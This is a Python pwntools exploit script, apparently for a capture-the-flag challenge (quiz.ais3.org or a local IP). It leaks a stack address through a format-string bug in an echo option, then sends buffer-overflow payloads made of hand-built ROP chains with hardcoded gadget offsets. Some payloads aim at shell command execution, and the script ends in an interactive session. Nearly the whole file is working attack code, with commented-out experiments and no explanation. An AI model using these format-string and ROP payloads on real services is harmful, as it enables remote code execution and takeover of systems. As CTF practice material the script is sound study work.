#!/usr/bin/env python
# -*- coding: ascii -*-
from pwn import *

#

host , port = 'quiz.ais3.org' , 4869
host , port = '192.168.78.247' , 7777
y = remote(host,port)


def bof( p ):
    y.sendafter( 'ice:' , '2\n' )
    y.sendafter( ':' , p )

def eco( p ):
    y.sendafter( 'ice:' , '1\n' )
    y.sendafter( ':' , p  )


remote_leak = 0x7FF775DA11B3
offset      = 0x11b3
remote_base = 0x7ff775da0000

loco_leak   = 0x7FF75F9511B3
offset      = 0x11b3
loco_base   = 0x7ff75f950000

ch_base     = 0x7ff711afb000
ch_echo     = 0x7ff711afbde0

ppr = 0x4599

system = 0x140004628

p = 'sh;DDDDD' + 'a' * ( 0x18 ) + p64( remote_base + 0x1051 ) + p64( 0x2 ) + p64( remote_base + 0x11bc )
#p = p64( remote_base + 0x11bc ) * 6
#p = 'a' * ( 3  )
#p = p64( 0x140001080 ) * 6

#print p

#bof( p )
                                                   #7FF775DBE098
# 75dbe098 7d1edeb8 7d1ef4b178 2578257825 78250 00007FF775DA11B3
# 7FF775DBE098
# 7FF775DBE098 7E9946E168
#              548F4DDA58

maigic = 0x7ffe34eed478
loco_magic = 0x7ffef99b3cf6


fmt = '%pABC%p\n'
eco( fmt )
y.recvuntil( 'ABC' )
o = y.recvline()[:-1]
stack = int( o , 16 )
log.success( 'stack -> {}'.format( hex( stack ) ) )


bye = 0x11bc


'''
fmt = '%p' * 1 + '%p' * 4 + 'QQ%s\na' + p64( stack + 0x20 ) + 'AAAA'
eco( fmt )

y.recvuntil( 'QQ' )
o = y.recvline()[:-1]
log.success( o )
data = u64( o.ljust( 8 , '\x00' ) )
log.success( hex( data ) )

ofs = 0
bas = stack



for i in range( 7777 ):
    fmt = '%p' * 1 + '%p' * 4 + 'QQ%s\na' + p64( bas - ofs + i * 0x8 ) + 'AAAA'
    eco( fmt )
    y.recvuntil( 'QQ' )
    o = y.recvline()[:-1]
    data = u64( o.ljust( 8 , '\x00' ) )
    log.success( '{} | {}'.format( hex( data ) , o ) )
    


fmt = '%p' * 1 + '%p' * 4 + 'QQ%s\na' + p64( stack + 0x10d0 ) + 'AAAA'
eco( fmt )
y.recvuntil( 'QQ' )
o = y.recvline()[:-1]
data = u64( o.ljust( 8 , '\x00' ) )
log.success( '{} | {}'.format( hex( data ) , o ) )
'''

'''

1dfb : mov rdx, r13 ; call rax
10a35 : pop rax ; ret
639a : pop r13 ; ret
12e07 : mov rcx, r11 ; ret
'''
pop_rax = 0x10a35
pop_r13 = 0x639a
pop_rsi = 0x1d45
ret     = 0x10b6
hl      = 0x1051
call_rsi = 0x25d8


r8d = 0x2643 # mov r8d, ebp ; mov edx, ebx ; mov rcx, rdi ; call rsi

p = 'D' * 0x20
p += p64( loco_base + pop_rsi )
p += p64( loco_base + ret )
p += p64( loco_base + r8d )
#p += p64( ret )
p += p64( 0x0 )
p += p64( 0x0 )
p += p64( 0x0 )
p += p64( 0x0 )
p += p64( 0x0 )
#p += p64( loco_base + 0x10c0 )
#p += p64( loco_base + r8d )
#p += p64( loco_base + hl )
#p += p64( 0x1 )
p += p64( loco_base + bye )
p += p64( loco_base + pop_rax ) 
p += p64( loco_base + 0x1182 ) 
p += p64( loco_base + bye )
p += p64( loco_base + pop_r13 )
p += p64( stack )
p += p64( loco_base + 0x1dfb ) # mov rdx, r13 ; call rax

'''
25d3   mov rdx, rbx ; mov ecx, edi ; call rsi
a64c   pop rbx ; pop rbp ; ret
11b74  xchg eax, ebp ; ret   

r8d    mov r8d, ebp ; mov edx, ebx ; mov rcx, rdi ; call rsi
'''

p = 'D' * 0x20
p += p64( loco_base + pop_rsi )
p += p64( loco_base + 0x1dfb )   # rsi = ( mov rdx, r13 ; call rax )
p += p64( loco_base + 0x11b74 )

p += p64( loco_base + pop_rax ) 
p += p64( loco_base + 0x1182 ) 
p += p64( loco_base + pop_r13 )   # pop rbx ; pop rbp ; ret
p += p64( stack )
p += p64( loco_base + r8d ) # mov r8d, ebp ; mov edx, ebx ; mov rcx, rdi ; call rsi
#p += p64( loco_base + 0x1dfb ) # mov rdx, r13 ; call rax


bof( p )


y.send( 'echo yuawn\x00' )

p = 'D' * 0x20
p += p64( loco_base + 0x1d44 )
p += p64( stack )
#p += p64( loco_base + hl )
p += p64( loco_base + 0x4632 )
#p += p64( loco_base + hl )
p += p64( loco_base + 0x2648 )

bof( p )



'''
p = 'a' * 0x20
p += p64( loco_base + pop_rax ) 
p += p64( loco_base + 0x4628 ) 
p += p64( loco_base + pop_r13 )
p += p64( stack + 2 )
p += p64( loco_base + 0x1dfb )
p += p64( loco_base + bye )
'''
#bof( p )












'''
fmt = '%p.%s'
eco( fmt )
y.recvuntil('.')
o = y.recvline()
log.success( o )
log.success( hex( u64( o[:-1].ljust(8 , '\x00') ) ) )
'''
#bof( 'a' * ( 0x20 - 1 ) )







y.interactive()